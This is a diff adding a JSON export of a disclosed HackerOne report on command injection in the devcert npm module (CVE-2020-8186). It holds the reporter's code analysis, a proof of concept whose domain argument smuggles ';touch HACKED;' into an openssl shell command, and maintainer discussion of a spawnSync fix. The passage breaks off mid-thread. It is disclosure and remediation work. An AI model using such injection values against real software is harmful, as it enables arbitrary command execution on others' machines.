@@ -1,0 +1,925 @@
+{
+  "id": 863544,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NjM1NDQ=",
+  "url": "https://hackerone.com/reports/863544",
+  "title": "[devcert] Command Injection via insecure command formatting",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-04-30T21:41:23.951Z",
+  "submitted_at": "2020-04-30T21:41:23.951Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "d3lla",
+    "url": "/d3lla",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8186"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-06-15T16:02:48.968Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-06-15T16:02:48.913Z",
+  "team_member_agreed_on_going_public_at": "2020-06-12T10:10:30.842Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a `Command Injection` issue in the `devcert` module.\nIt allows to execute arbitrary commands on the victim's PC.\n\n# Module\n\n**module name:** `devcert`\n**version:** `1.1.0`\n**npm page:** `https://www.npmjs.com/package/devcert`\n\n## Module Description\n\ndevcert - Development SSL made easy\n\n## Module Stats\n\n[276,467] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue occurs because a user input parameter is used inside a command that is executed without any check. \n\nI tested the `certificateFor` function.\n\nHere's the code which causes the issue:\n\n```javascript\n// https://github.com/davewasmer/devcert/blob/2b1b8d40eda251616bf74fd69f00ae8222ca1171/src/index.ts#L95\n\nexport async function certificateFor<O extends Options>(domain: string, options: O = {} as O): Promise<IReturnData<O>> { // <-- starting point\n  debug(`Certificate requested for ${ domain }. Skipping certutil install: ${ Boolean(options.skipCertutilInstall) }. Skipping hosts file: ${ Boolean(options.skipHostsFile) }`);\n\n  if (options.ui) {\n    Object.assign(UI, options.ui);\n  }\n\n  if (!isMac && !isLinux && !isWindows) {\n    throw new Error(`Platform not supported: \"${ process.platform }\"`);\n  }\n\n  if (!commandExists('openssl')) {\n    throw new Error('OpenSSL not found: OpenSSL is required to generate SSL certificates - make sure it is installed and available in your PATH');\n  }\n\n  let domainKeyPath = pathForDomain(domain, `private-key.key`);\n  let domainCertPath = pathForDomain(domain, `certificate.crt`);\n\n  if (!exists(rootCAKeyPath)) {\n    debug('Root CA is not installed yet, so it must be our first run. Installing root CA ...');\n    await installCertificateAuthority(options);\n  } else if (options.getCaBuffer || options.getCaPath) {\n    debug('Root CA is not readable, but it probably is because an earlier version of devcert locked it. Trying to fix...');\n    await ensureCACertReadable(options);\n  }\n\n  if (!exists(pathForDomain(domain, `certificate.crt`))) { \n    debug(`Can't find certificate file for ${ domain }, so it must be the first request for ${ domain }. Generating and caching ...`);\n    await generateDomainCertificate(domain); // <-- domain is our payload\n  }\n  ....\n\n\n...\n// https://github.com/davewasmer/devcert/blob/master/src/constants.ts#L19\nexport const pathForDomain: (domain: string, ...pathSegments: string[]) => string = path.join.bind(path, domainsDir)\n...\n\n// https://github.com/davewasmer/devcert/blob/master/src/certificates.ts#L44\n...\nexport default async function generateDomainCertificate(domain: string): Promise<void> {\n  mkdirp(pathForDomain(domain));\n\n  debug(`Generating private key for ${ domain }`);\n  let domainKeyPath = pathForDomain(domain, 'private-key.key');  // <-- the variable is in the form \n  generateKey(domainKeyPath);\n\n  debug(`Generating certificate signing request for ${ domain }`);\n  let csrFile = pathForDomain(domain, `certificate-signing-request.csr`);\n  withDomainSigningRequestConfig(domain, (configpath) => {\n    openssl(`req -new -config \"${ configpath }\" -key \"${ domainKeyPath }\" -out \"${ csrFile }\"`);\n  });\n\n  debug(`Generating certificate for ${ domain } from signing request and signing with root CA`);\n  let domainCertPath = pathForDomain(domain, `certificate.crt`);\n\n  await withCertificateAuthorityCredentials(({ caKeyPath, caCertPath }) => {\n    withDomainCertificateConfig(domain, (domainCertConfigPath) => {\n      openssl(`ca -config \"${ domainCertConfigPath }\" -in \"${ csrFile }\" -out \"${ domainCertPath }\" -keyfile \"${ caKeyPath }\" -cert \"${ caCertPath }\" -days 825 -batch`)\n    });\n  });\n}\n\n// Generate a cryptographic key, used to sign certificates or certificate signing requests.\nexport function generateKey(filename: string): void {\n  debug(`generateKey: ${ filename }`);  // <-- injection\n  openssl(`genrsa -out \"${ filename }\" 2048`);\n  chmod(filename, 400);\n}\n```\n\nThe input parameter `domain` is used to build the `domainKeyPath` variable.\nIf we pass `\\\";touch HACKED;\\\"` as input, the variable  `domainKeyPath` will be something like this: `/home/ubuntu/.config/devcert/domains/\";touch HACKED;\"/private-key.key` (the first part depends on your OS).\nAs we can see the variable contains a valid shell command. Then, this variable is passed to the function `generateKey`, that finally calls `openssl` function:\n```javascript\n// https://github.com/davewasmer/devcert/blob/master/src/utils.ts#L12\nimport { execSync, ExecSyncOptions } from 'child_process';\nimport tmp from 'tmp';\nimport createDebug from 'debug';\nimport path from 'path';\nimport sudoPrompt from 'sudo-prompt';\n\nimport { configPath } from './constants';\n\nconst debug = createDebug('devcert:util');\n\nexport function openssl(cmd: string) {\n  return run(`openssl ${ cmd }`, {  // <-- the command executed is: openssl genrsa -out \"/home/ubuntu/.config/devcert/domains/\";touch HACKED;\"/private-key.key\" 2048\n    stdio: 'pipe',\n    env: Object.assign({\n      RANDFILE: path.join(configPath('.rnd'))\n    }, process.env)\n  });\n}\n\nexport function run(cmd: string, options: ExecSyncOptions = {}) {\n  debug(`exec: \\`${ cmd }\\``);\n  return execSync(cmd, options);  // <-- call child_process.execSync \n}\n...\n\n```\n\n## Steps To Reproduce:\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install `devcert` module:\n    -  `npm i devcert`\n- create the following PoC JavaScript file (`poc.js`):\n\n```javascript\nconst devcert = require('devcert');\n\nasync function poc() {\n    let ssl = await devcert.certificateFor('\\\";touch HACKED;\\\"');\n}\npoc()\n```\n- make sure that the `HACKED` file does not exist:\n    - `ls`\n- execute the `poc.js` file:\n    - `node poc.js`\n- the `HACKED` file is created:\n    - `ls`\n    \n{F810294}\n\n\n## Patch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it. \nIn my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.execSync`.\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v13.13.0\n- NPM VERSION: 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nCommand Injection on `devcert` module via insecure command formatting.",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 810294,
+      "file_name": "poc_devcert.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/NC1f9pwuq8isuiJYJqsdb4At?response-content-disposition=attachment%3B%20filename%3D%22poc_devcert.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_devcert.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQM3U3QWN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072817Z&X-Amz-Expires=2932&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC8AS0gj74xLCqoISG6HxbEYSI0PEfdF96wfaJ9XQRYXAIhANMJJf7iKjV7IKfTVUDY%2FFCPGSxnhIyV8N48256%2BMYR9KrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igxhj6IY2dpHIu8rk%2FQqjgVrs6hBhGYkbRpwnTMlcXODs%2BzBfQF20UuznJ4WeEETbBCS5xrQKwNciUh8fTXTf3AeLW8ma7i6nN2J%2FTPJmdDJep9LOqCCNnNfoot3TxHeog3PIzq8bBqzv%2FWnZ6WZiSTCgT0fRuUO%2F0NoLfCI2HO7HAJbzDCBBPLDbovCdCCec9tOhSCo4zeTxGL%2B5eNFzvxdrScMsFkSDHqK1nYzB%2BNHu67VcVBNgokTZ%2FiE0D5F2UMHD7Q41spCK9XBNhkLLcYkYcOLSZPgh0y0%2BhAqiB%2F5M75rvi%2FwL4GzjvstCuMp7%2BMlU5uW0LxRNU4av%2Fnf1lTfZJBbJdVp7t47cyPMsPTAh8YfP7rASoDKsUHiH%2BFUgz23qjds1QkLL5EbNJyfMeGE%2BXtoslgNninHIYEKrR5ds5PZuyrZzZMTDLF%2Fh1nIMmJ5vq2TjJfh421jqFfaYQ9GW34apWkiqGr0hGH8SptwKhv4intOnjJEMXalYWlbtl1Pzp1BC18KUB2I%2FxBURyEaaUVKRBbvabpkEgXV%2FnQqzWJTjCL5HnMD4ljLJgc%2BWfWt1Q1EKcMewZWvcY5%2By7QeV5XQIye%2F0GmL5eIhaBkMGzga%2B%2BT%2Btd2hzvF%2BJzR2we9VQYubOGxpQQuF9r%2FV8wkrGgx3sAX8Zd2QX8ckdW6pg1Klcdh7SLABopVWthPu4QV7L3BabFZmhQUAZxdk0ekb1%2Fw1u8af%2Fr51748Lwtjkx8eOWD49jDTLn6Xt0mW91m5QJ4eaq4%2FNmdjUMwnuXKlgK8ZooXSz0KzkvnZ9T%2F7ULiIfcJCltTowwu8hMBaBndUsJxqBhc8BqU6f%2BkchljSoaUmROWNJOFB0Hq9gD7TyVdCAdV0rFjpJkF%2Bqsjsw2Ym5qAY6sAF%2B%2FtGSYZrDIqtpyxX4SjQXtSTuGpkpw2NJ5IoQLX1kapRTuos3cgYmRQqD2osbXW8GAYux38XCyjB7nnsQGwJ0JEKqlWKQK6b0%2FrXO6AT6H0SgoF4kOVUPnUFGdGx5WY2LMvGJ%2FMBV8%2BSm%2FBqOEyct%2F4MP9bhaeuzEeKXirmXTi9G37p059sF1j%2Fald6zrk2x03j7jMV76l15cHOy6ntmTDUBjHYJB0MZDtEpHFj1bVg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fc66e9c169774fdbf23b5728874c41cab5a431f411bed67793d2b80e2271dbf0",
+      "file_size": 5602779,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-07-12T10:10:30.911Z",
+  "allow_singular_disclosure_after": -100905466.22872981,
+  "singular_disclosure_allowed": true,
+  "vote_count": 11,
+  "voters": [
+    "kegn",
+    "brahim_boufakri01",
+    "mayurudiniya",
+    "fle_xxx",
+    "mr_n30",
+    "d4rkm4tter",
+    "fsamaj",
+    "pk_12397",
+    "mrsalles",
+    "xnum",
+    "and 1 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 49301,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "devcert",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 7862363,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @d3lla,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@ktistai",
+      "automated_response": false,
+      "created_at": "2020-05-01T10:05:25.069Z",
+      "updated_at": "2020-05-01T10:05:25.069Z",
+      "actor": {
+        "username": "ktistai",
+        "cleared": false,
+        "verified": false,
+        "url": "/ktistai",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 7862518,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-05-01T10:21:08.202Z",
+      "updated_at": "2020-05-01T10:21:08.202Z",
+      "additional_data": {
+        "old_severity": "Critical",
+        "new_severity": "Critical (9.8)",
+        "old_severity_id": 708813,
+        "new_severity_id": 709239
+      },
+      "actor": {
+        "username": "ktistai",
+        "cleared": false,
+        "verified": false,
+        "url": "/ktistai",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 7862520,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Hello @d3lla,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@ktistai",
+      "automated_response": false,
+      "created_at": "2020-05-01T10:21:13.867Z",
+      "updated_at": "2020-05-01T10:21:13.867Z",
+      "actor": {
+        "username": "ktistai",
+        "cleared": false,
+        "verified": false,
+        "url": "/ktistai",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8055250,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi,\n\nI hope everyone is staying safe :)\n\nI would like to know, is there any update?\n\nThanks for your time and have a nice day,\nd3lla\n",
+      "automated_response": false,
+      "created_at": "2020-05-20T07:35:32.632Z",
+      "updated_at": "2020-05-20T07:35:32.632Z",
+      "actor": {
+        "username": "d3lla",
+        "cleared": false,
+        "verified": false,
+        "url": "/d3lla",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8190516,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-06-03T13:55:56.283Z",
+      "updated_at": "2020-06-03T13:55:56.283Z",
+      "actor": {
+        "username": "davewasmer",
+        "cleared": false,
+        "verified": false,
+        "url": "/davewasmer",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8190596,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for the vulnerability report! However I’m a little confused about what this would actually expose. Devcert doesn’t run with any special permissions, so if you are invoking the code programmatically or via the CLI, the attacker already has permissions to run child_process.exec or run any command from the command line  ",
+      "automated_response": false,
+      "created_at": "2020-06-03T14:03:29.896Z",
+      "updated_at": "2020-06-03T14:03:29.896Z",
+      "actor": {
+        "username": "davewasmer",
+        "cleared": false,
+        "verified": false,
+        "url": "/davewasmer",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8193871,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @davewasmer,\n\nThanks for your reply.\n\nI agree with you that if an attacker can run the code via the CLI, can also run any command from the command line.\n\nBut there are other situations that should be taken into account.\n\nFirst, the purpose of the library is not to run arbitrary commands passed as parameter.\n\nSecond, and probably the most important, if your library is used as part of another application that can be called remotely, that would led to a `Remote Code Execution`.\n\nReading the description of the project: *“devcert has been designed from day one to work as low-level library that other tools can delegate to.”* So, if you library is used as part of another system and if it’s called remotely (for example someone that wants to setup a dev machine remotely), this could potentially allows an attacker to execute arbitrary commands exploiting this vulnerability.\n\nHere there are some references that could be helpful:\n- [child_process.exec](https://nodejs.org/api/child_process.html#child_process_child_process_exec_command_options_callback)\n- [ CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection’)](https://cwe.mitre.org/data/definitions/77.html)\n- [Avoid-Command-Injection-Node.js](https://gist.github.com/evilpacket/5a9655c752982faf7c4ec6450c1cbf1b)\n\nThanks for your time.\nStay safe.\n\nd3lla",
+      "automated_response": false,
+      "created_at": "2020-06-03T18:15:32.011Z",
+      "updated_at": "2020-06-03T18:15:32.011Z",
+      "actor": {
+        "username": "d3lla",
+        "cleared": false,
+        "verified": false,
+        "url": "/d3lla",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8208620,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@davewasmer does this help explain why this may be a security vulnerability under certain circumstances?",
+      "automated_response": false,
+      "created_at": "2020-06-05T08:25:06.930Z",
+      "updated_at": "2020-06-05T08:25:06.930Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8228921,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@davewasmer I'd like to figure out the disclosure timeline for this report and I am wondering if you plan to release a patch for this vulnerability?",
+      "automated_response": false,
+      "created_at": "2020-06-08T09:12:43.681Z",
+      "updated_at": "2020-06-08T09:12:43.681Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8236401,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@marcinhoppe sorry for the delays here. Your explanation definitely makes sense. I'd like to invite James Zetlen (zetlen@gmail.com) into the thread here, as he has taken over the management of the project, but I don't see that functionality anywhere. Would you be able to invite him?",
+      "automated_response": false,
+      "created_at": "2020-06-08T20:24:01.791Z",
+      "updated_at": "2020-06-08T20:24:01.791Z",
+      "actor": {
+        "username": "davewasmer",
+        "cleared": false,
+        "verified": false,
+        "url": "/davewasmer",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8236430,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@davewasmer I just sent an invite to zetlen@gmail.com.",
+      "automated_response": false,
+      "created_at": "2020-06-08T20:29:55.254Z",
+      "updated_at": "2020-06-08T20:29:55.254Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8236750,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-06-08T21:05:44.435Z",
+      "updated_at": "2020-06-08T21:05:44.435Z",
+      "actor": {
+        "username": "zetlen",
+        "cleared": false,
+        "verified": false,
+        "url": "/zetlen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8236753,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for the invite and for the heads-up, @davewasmer ",
+      "automated_response": false,
+      "created_at": "2020-06-08T21:06:44.382Z",
+      "updated_at": "2020-06-08T21:06:44.382Z",
+      "actor": {
+        "username": "zetlen",
+        "cleared": false,
+        "verified": false,
+        "url": "/zetlen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8236818,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I see and understand the remote exec problem. It all goes through https://github.com/davewasmer/devcert/blob/master/src/utils.ts where we're building command strings and running them through `child_process.execSync`\n\n```js\nexport function run(cmd: string, options: ExecSyncOptions = {}) {\n  debug(`exec: \\`${ cmd }\\``);\n  return execSync(cmd, options);\n}\n```\n\n(and elsewhere, but this is the main hot path)",
+      "automated_response": false,
+      "created_at": "2020-06-08T21:14:03.464Z",
+      "updated_at": "2020-06-08T21:14:03.464Z",
+      "actor": {
+        "username": "zetlen",
+        "cleared": false,
+        "verified": false,
+        "url": "/zetlen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8236834,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "And thanks @d3lla for bringing it to our attention",
+      "automated_response": false,
+      "created_at": "2020-06-08T21:15:46.840Z",
+      "updated_at": "2020-06-08T21:15:46.840Z",
+      "actor": {
+        "username": "zetlen",
+        "cleared": false,
+        "verified": false,
+        "url": "/zetlen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8237051,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I'll release a patch for this today. I'll comment here with a link to the pull request and then leave a two-hour interval for your feedback and review.\n\nSneak preview: For the **patch**, I will probably switch from `execSync` to `spawnSync`, because that's the least intrusive change to the current codebase.\n\nPOC of this:\n\n```js\nconst { execSync, spawnSync } = require('child_process');\n\nconst unsafeCertificateFor = domain => {\n  return execSync(`printf \"unsafeCertificateFor: Created cert for %s\" ${domain}`, { encoding: 'utf8' });\n}\n\nconst safeCertificateFor = domain => {\n  return spawnSync('printf', ['safeCertificateFor: Created cert for %s', domain], { encoding: 'utf8' }).stdout;\n}\n\nconsole.log(unsafeCertificateFor(';touch EXEC_SYNC_MADE_THIS;ls -lt EXEC_SYNC_MADE_THIS'));\nconsole.log(safeCertificateFor(';touch SPAWN_SYNC_MADE_THIS;ls -lt SPAWN_SYNC_MADE_THIS'));\n```\n\noutput:\n```\nunsafeCertificateFor: Created cert for -rw-r--r--  1 zetlen  staff  0 Jun  8 16:46 EXEC_SYNC_MADE_THIS\n\nsafeCertificateFor: Created cert for ;touch SPAWN_SYNC_MADE_THIS;ls -lt SPAWN_SYNC_MADE_THIS\n```\n\nIn the next major release, we will probably move away from doing this many shell commands entirely, in favor of libraries like node-forge and hostile. We'll still have to elevate privileges, but we'll sanitize input in the way of my example above.\n\nI'll put up this pull request later this afternoon.\n\nThanks!\nZ",
+      "automated_response": false,
+      "created_at": "2020-06-08T21:52:21.452Z",
+      "updated_at": "2020-06-08T21:52:21.452Z",
+      "actor": {
+        "username": "zetlen",
+        "cleared": false,
+        "verified": false,
+        "url": "/zetlen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8240615,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@zetlen Thanks for a detailed writeup! We'll keep an eye on this report to take a look at the PR.",
+      "automated_response": false,
+      "created_at": "2020-06-09T09:13:03.435Z",
+      "updated_at": "2020-06-09T09:13:03.435Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8245796,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for your patience, @marcinhoppe . Here is the pull request: https://github.com/davewasmer/devcert/pull/55\n\nI tested this extensively on supported platforms and there don't appear to be regressions. Since I opened it today instead of yesterday as I planned, I'll give you more time to review it before merging. I plan to merge and publish the patch at midnight UTC today.",
+      "automated_response": false,
+      "created_at": "2020-06-09T18:19:34.723Z",
+      "updated_at": "2020-06-09T18:19:34.723Z",
+      "actor": {
+        "username": "zetlen",
+        "cleared": false,
+        "verified": false,
+        "url": "/zetlen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8247974,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
